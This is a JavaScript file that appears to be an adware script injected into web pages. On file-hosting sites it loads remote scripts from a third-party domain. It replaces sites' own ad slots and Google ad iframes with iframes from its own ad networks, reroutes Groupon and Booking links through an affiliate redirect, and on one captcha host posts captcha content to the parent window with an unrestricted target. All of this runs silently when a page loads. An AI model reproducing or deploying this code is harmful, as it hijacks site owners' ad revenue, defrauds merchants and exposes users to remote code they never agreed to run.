var loc = (location.href.match(/zatetv=/i));
if (location.href.match(/^http:\/\/(www\.)?bayfiles\.net/i) && loc) {
    addScript("bayfiles");
}else if (location.href.match(/^http:\/\/(www\.)?billionuploads\.com/i) && loc) {
    addScript("billion");
}else if (location.href.match(/^http:\/\/(www\.)?hugefiles\.net/i) && loc) {
    addScript("huge");
}else if (location.href.match(/^http:\/\/(www\.)?vshare\.eu/i) && loc) {
    addScript("videoshare");
}else if (location.href.match(/^http:\/\/(www\.)?180upload\.com/i) && loc) {
    addScript("180upload");
}else if (location.href.match(/^http:\/\/(www\.)?uptobox\.com/i) && loc) {
    addScript("uptobox");
}

function addScript(a) {
    var s = document.createElement('script');
    s.setAttribute("type", "text/javascript");
    s.setAttribute("src", "http://mirrors.zate.tv/" + a + ".js");
    document.getElementsByTagName("head")[0].appendChild(s);
}

 function xv() {
    if (location.href.match(/static\.ak\./i)) {
        return false
    } else if ("https:" == document.location.protocol) {
        return false
    } else if (location.href.match(/\.addthis\.com\/static\//i)) {
        return false
    } else if (location.href.match(/^secure\.shared\.live\.com/i)) {
        return false
    } else if (location.href.match(/^megaupload\.com\/mc\.php/i)) {
        return false
    } else if (location.href.match(/^\.com\/blank\.html/i)) {
        return false
    } else if (location.href.match(/^http\:\/\/analytics\./i)) {
        return false
    } else if (location.href.match(/^\.hotmail\.com\//i)) {
        return false
    } else if (location.href.match(/^\.facebook\.com\/plugins/i)) {
        return false
    } else if (location.href.match(/^api\.twitter\.com\/receiver\.html/i)) {
        return false
    } else if (location.href.match(/^facebook\.com\/iframe\//i)) {
        return false
    } else if (location.href.match(/^\.zate\.tv/i)) {
        return false
    } else if (location.href.match(/trafficjunky\.net/i)) {
        return false
    } else if (location.href.match(/moviezet\.com/i)) {
        return false
    } else if (location.href.match("google.com/")) {
        return false
    } else if (location.href.match("zedo.com/")) {
        return false
    } else if (location.href.match("api.solvemedia.com")) {
        if (parent.location.hostname.match(/(www)?rapidgator\.net/)) {
            parent.window.postMessage(document.getElementById("mother").innerHTML, "*")
        }
        return false
    } else {
        return true
    }
}

function xmat(b,a){
	if(a){
	if(b.width=="300" || b.width=="336"){
        b.src = "http://www.doopmedia.com/api.php?unique=8461456"; 
        }else if(b.width=="728"){
                b.src = "http://ads.cloudz.im/728.html";
                }else if(b.height=="600"){
        b.src = "http://ads.cloudz.im/120.html";
        }else{
         b.src = "http://www.doopmedia.com/api.php?unique=8461456";
        }
    }else{
	if(b.width=="300" || b.width=="336"){
        b.src = "http://www.doopmedia.com/api.php?unique=8461456"; 
        }else if(b.width=="728"){
        b.src = "http://ads.cloudz.im/728.html";  
        }else if(b.height=="600"){
        b.src = "http://ads.cloudz.im/120.html";
        }else{
        b.src = "http://www.doopmedia.com/api.php?unique=8461456";
        }
    }  
}

function xw() {
    var a = document.getElementsByTagName("iframe");
        var ads= ['http://ads.adjalauto.com/banneri?','http://adk2trk.cpmrocket.com/player.html?','http://tag.tlvmedia.com/?','http://ib.adnxs.com/tt?','http://x.descojonados.com/','http://www.xpiral.net/','http://creative.xtendmedia.com/proxy/matomymediaproxy.html?','http://dlvr.readserver.net/imp.php?','http://yieldmanager.adbooth.net/st?','http://code.taggify.net/tag.ashx?','http://nym1.ib.adnxs.com/if?','http://serve.adhance.com/www/delivery/afr.php?','http://ad.directrev.com/','http://n5.adshostnet.com/ads?','http://ads.affbuzzads.com/smart_ad/display?','/static_ads/play_ad.php?embed','http://adserving.cpxinteractive.com/st?','http://ad.foxnetworks.com/st?','http://ad.xtendmedia.com/st?','http://ad.harrenmedianetwork.com/st?','http://ad.metanetwork.com/st?','http://ad.smowtion.com','http://wlxrs.com','http://ad.blinkdr.com/st?','http://www.todoanimes.com/ads/','http://ad.z5x.net/st?','http://ad.adfunky.com/st?','http://ads.creafi-online-media.com/st?','http://ver-pelis.net/ads','http://ad.jumbaexchange.com/st?','http://www.ver-pelis.net/ads/','www.ver-pelis.net/wtf/','http://www.pelispedia.com/ads/','http://ads.avazu.net/st?','http://ad.yieldads.com/st?','http://ad.adnetinteractive.com/st?','http://ad.bannerconnect.net/st?','http://ads.jumbaexchange.com/st?','http://ad.e-viral.com/st?','http://ads.tlvmedia.com/st?','http://ad.adperium.com/st?','http://ads.jumbaexchange.com/st?','esandroid.net','http://go.cpmadvisors.com/st?','http://ad.xertive.com/st?','http://ad.media-servers.net/st?','http://www.ver-pelis.net/mc/','http://go.cpmadvisors.com/st?','http://ad.globe7.com/st?','http://ad.103092804.com/st?','http://ad.globaltakeoff.net/st?','http://ads.bluelithium.com/st?','http://ad.antventure.com/st?','http://ad.reduxmedia.com/st?','http://ad.adtegrity.net/st?','http://ad.directaclick.com/st?','.mediashakers.com/id','http://ad.adserverplus.com/st?','http://ad.yieldmanager.com/st?','tradex.openx.com/afr.php?','.affiz.net/tracking/iframedfp.php','adserver.itsfogo.com/','.pasadserver.com/showBanner.php','ads.lfstmedia.com/slot','ads.sonicomusica.com/ad','ads.adpv.com/iframe','cuevana.tv/banners/','matomy-la.com','adserver.adtechus.com/adiframe','mooxar.info/openx/','bs.serving-sys.com/BurstingPipe','ad.adserver01.de/','.adsmwt.com/st','ad.vuiads.net/showads','static.seeon.tv/ads/','www.redditmedia.com/ads/','justjared.buzznet.com/wp-content/themes/default/ads/banner.php','adserving.cpxadroit.com/','ads.mapcity.com/','edge.actaads.com/a_','www.adsomega.com/www/delivery','.zedo.com/','myintextual.net/tags/','ads.ad4game.com/www/delivery/','multiupload.com/ad.php','thepiratebay.sc','alexa.com/tfBuster.html','ad.adnetwork.net/st?','.megaclick.com/ybrant.php','f.megaclick.com','tec-nologias.com/','tumejorfrase.com','images.mcanime.net/manga/','ads.tlvmedia.com/st?','about:blank','http://cdn.interstitials.net/rmx2secure/?','http://www.sipeliculas.com/','http://ib.adnxs.com/acb?','http://ads.staticyonkis.com/www/delivery/afr.php?','ads.staticyonkis.com/'];
	for (var d = 0; d < a.length; d++) {
         for (var j = 0; j < ads.length; j++) {
            if (a[d].src.indexOf(ads[j]) !== -1) {
                xl(a[d]);
            }
        }
    }
}

function xl(c) {
    if (tam(c.width+'x'+c.height,true)) {
        xmat(c,true);
        return;
    }else if(tam(c.width+'x'+c.height,false)){
        xmat(c,false);
    }
}


function tam(me,a) {
    var val = null;
    if(a)
        val = ['300x250', '728x90', '160x600', '120x600', '336x280'];
    else
        val = ['300x250', '728x90', '160x600','468x60','800x600','120x20','120x600','800x440','336x280','280x336','250x250','234x60','500x500','800x500','300x600','720x300'];
    
    var ret = false;

    for (var i = 0; i < val.length; i++) {
        if (me == val[i]) {
            ret = true;
            break;
        }
    }

    return ret;

}



function xlulx() {
    var xys = document.getElementsByTagName('text');
        
    if(xys.length != 0){ 
        
        for (var i = 0; i < xys.length; i++) {
            var ifr = xys[i];

            while (ifr.tagName.toLowerCase() != 'html') {
                
                if(ifr.tagName.toLowerCase() == 'body'){
                    var w = ifr.offsetWidth;
                    var h = ifr.offsetHeight;
                    if(tam(w+'x'+h,true)){
                     			 ifr.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://7bam.com/get.htm?20=' + w + '&30=' + h + '"></iframe>'; 
 		                        }else{ 
                        if(tam(w+'x'+h,false)){
                            ifr.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+w+'" height="'+h+'" src="http://s.m2pub.com/player.html?a=11884011&size=' + w + 'x' + h + '&ci=1&context=c11882010"></iframe>'; 
                        }
                    }       
                }
                ifr = ifr.parentNode;       
            }
        }
    }else{
        
        var xsy = document.getElementsByTagName('img');
        var fra = document.getElementsByTagName("iframe");
        var lar=Math.max(xsy.length,fra.length);
        
        for(var x = 0; x < lar ; x++){
            try {
                if(xsy[x].alt == 'Anuncios Google' || xsy[x].src.indexOf('http://a.adroll.com/') !== -1 || xsy[x].src.indexOf('//c.betrad.com/') !== -1){
                    var ifra = xsy[x];
                    while (ifra.tagName.toLowerCase() != 'html') {
                        if(ifra.tagName.toLowerCase() == 'body'){
                            var wa = ifra.offsetWidth;
                            var ha = ifra.offsetHeight;
                            if(tam(wa+'x'+ha,true) && xsy[x].src.indexOf('http://a.adroll.com/') === -1 && xsy[x].src.indexOf('//c.betrad.com/') === -1){
                        				ifra.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+wa+'" height="'+ha+'" src="http://7bam.com/get.htm?20=' + wa + '&30=' + ha + '"></iframe>'; 
 			                                   
                            }else{ 
                                if(tam(wa+'x'+ha,false)){
                                    ifra.innerHTML = '<iframe FRAMEBORDER=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=NO width="'+wa+'" height="'+ha+'" src="http://s.m2pub.com/player.html?a=11884011&size=' + wa + 'x' + ha + '&ci=1&context=c11882010"></iframe>'; 
                                   }
                            }       
                        }
                        ifra = ifra.parentNode;       
                    }
               }else{
                
                    var d = (fra[x].id.indexOf('google_ads') !== -1);
                    var e = (fra[x].name.indexOf('google_ads') !== -1);
                     var f = (fra[x].name.indexOf('aswift_') !== -1);
                    var j = (fra[x].id.indexOf('ad_creative_') !== -1);
                    
                    if(d || e || f || j){
                        var sz = fra[x].offsetWidth+'x'+fra[x].offsetHeight;
                        if(tam(sz,true)) {
                                                    fra[x].src = 'http://7bam.com/get.htm?20=' + fra[x].offsetWidth + '&30=' + fra[x].offsetHeight;
			                        }else if(tam(sz,false)){
                            fra[x].src = 'http://s.m2pub.com/player.html?a=11884011&size=' + sz + '&ci=1&context=c11882010';
     
                        }
                    }
                }
            } catch (e) {
            }
        }
        
      
    }
}

var domains = ['groupon.com.mx','groupon.cl','booking.com'];
function checkValidDesc(a) {
    for (var i = 0; i < domains.length; i++) {
        if (a.match("^(http|https)\:\/\/(www\.)?" + domains[i].replace("\.", "\\\."))) {
            return true;
        }
    }
    return false;
}
function isLink(a) {
    if (a.href == "") {
        return false;
    }
    var b = /(http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;
    return b.test(a.href);
}
function insertDesc() {
    var a = document.getElementsByTagName("a");
    for (var i = 0; i < a.length; i++) {
        if (!isLink(a[i]) || document.domain.match((a[i].href.match(":\/\/(.[^/]+)")[1]).replace('www.', ''))) {
            continue;
        }
        if (checkValidDesc(a[i].href)) {
            a[i].href = "http://descuentodos.com/redirect.php?link=" + a[i].href;
        }
    }
}

if (xv()) {
    xlulx();
    insertDesc();
    //xw();
   }
